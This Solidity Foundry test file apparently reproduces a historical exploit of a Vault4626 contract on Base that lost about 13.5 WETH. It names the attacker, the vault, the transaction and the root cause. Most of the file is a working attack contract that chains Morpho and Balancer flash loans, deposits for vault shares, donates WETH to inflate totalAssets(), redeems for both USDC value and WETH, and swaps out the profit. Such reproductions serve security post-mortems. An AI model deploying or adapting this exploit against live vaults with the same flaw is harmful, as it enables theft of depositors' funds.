// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~13.53 WETH
// Attacker : 0xA27eAE743Cd8C03E9b7c25ebF43DADbBC6Df9bFA
// Attack Contract : 0x47e775b8f175034b22fbA3A0F5B9E0F02551Af3C
// Vulnerable Contract : 0xD08579102fc28355C5839019b730Ce58F84E6a4d
// Attack Tx : https://basescan.org/tx/0x2f2e12fbdf541c28f3667153e5338f73a313096338dc5ca592453566debcd790

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xD08579102fc28355C5839019b730Ce58F84E6a4d#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2071495744071086510
//
// Attack summary: deposit borrowed USDC for nearly all vault shares, donate WETH to inflate totalAssets,
// then redeem so the vault pays USDC value and the actual WETH side.
// Root cause: Vault4626.totalAssets() quotes idle non-asset WETH into asset value, while redeem() later
// transfers the non-asset WETH itself to the redeemer.

address constant ATTACKER = 0xA27eAE743Cd8C03E9b7c25ebF43DADbBC6Df9bFA;
address constant ATTACK_CONTRACT = 0x47e775b8f175034b22fbA3A0F5B9E0F02551Af3C;
address constant VAULT_PROXY = 0x72dbAA8A09d71D09c6De0de439968e1E7c122020;
address constant VAULT_IMPLEMENTATION = 0xD08579102fc28355C5839019b730Ce58F84E6a4d;
address constant STRATEGY_PROXY = 0xe6644AE61EcA940B1201e0fe2c0574b3bE60cf9F;
address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant UNISWAP_V3_ROUTER = 0x2626664c2603336E57B271c5C0b26F421741e481;
address constant USDC_TOKEN = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant WETH_TOKEN = 0x4200000000000000000000000000000000000006;

uint256 constant FORK_BLOCK = 47_958_574;
uint256 constant USDC_FLASH_AMOUNT = 1_755_018_731_120;
uint256 constant WETH_FLASH_AMOUNT = 12.92 ether;
uint24 constant WETH_USDC_POOL_FEE = 3000;

interface IVault4626 {
    function deposit(
        uint256 assets,
        address receiver
    ) external returns (uint256 shares);
    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256 assets);
    function totalAssets() external view returns (uint256);
}

interface IBaseSwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

contract ContractTest is BaseTestWithBalanceLog {
    Vault4626Exploit private exploit;

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);

        fundingToken = WETH_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical Attack Contract");
        vm.label(VAULT_PROXY, "Vault4626 Proxy");
        vm.label(VAULT_IMPLEMENTATION, "Vault4626 Implementation");
        vm.label(STRATEGY_PROXY, "Vault4626 Strategy Proxy");
        vm.label(MORPHO, "Morpho");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(UNISWAP_V3_ROUTER, "Uniswap V3 Router");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WETH_TOKEN, "WETH");

        exploit = new Vault4626Exploit();
    }

    function testExploit() public balanceLog {
        uint256 attackerWethBefore = IERC20(WETH_TOKEN).balanceOf(ATTACKER);
        uint256 vaultAssetsBefore = IVault4626(VAULT_PROXY).totalAssets();

        vm.prank(ATTACKER);
        exploit.start();

        uint256 attackerWethProfit = IERC20(WETH_TOKEN).balanceOf(ATTACKER) - attackerWethBefore;
        assertGt(attackerWethProfit, 13 ether, "WETH profit not reproduced");
        assertLt(IVault4626(VAULT_PROXY).totalAssets(), vaultAssetsBefore, "vault assets not reduced");
    }
}

contract Vault4626Exploit {
    constructor() {
        IERC20(USDC_TOKEN).approve(VAULT_PROXY, type(uint256).max);
        IERC20(USDC_TOKEN).approve(MORPHO, type(uint256).max);
        IERC20(USDC_TOKEN).approve(UNISWAP_V3_ROUTER, type(uint256).max);
    }

    function start() external {
        IMorphoBuleFlashLoan(MORPHO).flashLoan(USDC_TOKEN, USDC_FLASH_AMOUNT, "");
        IERC20(WETH_TOKEN).transfer(ATTACKER, IERC20(WETH_TOKEN).balanceOf(address(this)));
    }

    function onMorphoFlashLoan(
        uint256 assets,
        bytes calldata
    ) external {
        require(msg.sender == MORPHO, "unexpected morpho callback sender");

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH_TOKEN);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = WETH_FLASH_AMOUNT;

        IBeethovenVault(BALANCER_VAULT)
            .flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, abi.encode(assets));
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == BALANCER_VAULT, "unexpected balancer callback sender");
        require(address(tokens[0]) == WETH_TOKEN, "unexpected flash token");

        uint256 morphoRepayment = abi.decode(userData, (uint256));

        // step 1: deposit the Morpho USDC flash loan and receive vault shares.
        uint256 shares = IVault4626(VAULT_PROXY).deposit(morphoRepayment, address(this));

        // step 2: donate the Balancer WETH flash loan so totalAssets() quotes it into USDC value.
        IERC20(WETH_TOKEN).transfer(VAULT_PROXY, amounts[0]);

        // step 3: redeem shares; vulnerable redeem pays both USDC value and the WETH side.
        IVault4626(VAULT_PROXY).redeem(shares, address(this), address(this));

        // step 4: convert the surplus USDC above the Morpho repayment to WETH for final profit.
        uint256 usdcSurplus = IERC20(USDC_TOKEN).balanceOf(address(this)) - morphoRepayment;
        IBaseSwapRouter(UNISWAP_V3_ROUTER)
            .exactInputSingle(
                IBaseSwapRouter.ExactInputSingleParams({
                    tokenIn: USDC_TOKEN,
                    tokenOut: WETH_TOKEN,
                    fee: WETH_USDC_POOL_FEE,
                    recipient: address(this),
                    amountIn: usdcSurplus,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );

        // step 5: repay the Balancer WETH flash loan.
        IERC20(WETH_TOKEN).transfer(BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }
}
